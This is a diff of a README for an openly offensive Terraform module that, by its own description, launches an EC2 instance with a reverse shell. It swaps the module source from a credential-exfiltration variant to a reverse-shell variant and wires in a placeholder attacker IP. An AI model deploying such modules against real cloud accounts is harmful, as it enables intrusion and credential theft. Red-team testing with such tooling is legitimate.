@@ -11,7 +11,7 @@ Offensive Terraform module which creates EC2 instance and reverse shell from an 
 ## Usage
 ```
 module "ec2_instance_credential_exfiltration" {
-    source  = "offensive-terraform/ec2-instance-credential-exfiltration/aws"
+    source  = "offensive-terraform/ec2-instance-reverse-shell/aws"
 
     subnet_id = "subnet-0a4a1cc04"
     attacker_ip = "0.0.0.0"
